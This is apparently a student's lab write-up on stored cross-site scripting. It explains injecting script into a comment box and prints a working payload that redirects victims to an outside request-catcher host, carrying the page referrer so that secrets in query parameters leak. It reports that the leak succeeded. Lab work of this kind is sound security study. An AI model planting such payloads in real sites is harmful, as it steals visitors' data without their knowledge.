# DOTA Lab 4 Part 2

> Partner: t0933492

## Description

The part is about Stored XSS. We injected a malicious javascript code into the comment box using the test accounts. The code will do some evil things like redirecting the victim into a malicious website or steal victim's information when accessing the website that was injected.

## Solution

Based on my observation, the comment list will only show up after submitting a comment and the submission is ONLY through GET methods, which means that every information is contained in the query parameters. So I wrote this script

```javascript
<script> 
  location.href = 'https://dotalab4.requestcatcher.com/' + document.referrer
</script>
```

I created a website as a 'web hook', to catch the information. The script will redirect the victim to the hook website with its information carried out to it.

## Evaluation

The result seems that the hook successfully caught the request sent by victim and the secret is leaked.

![](./img/webhook.png)
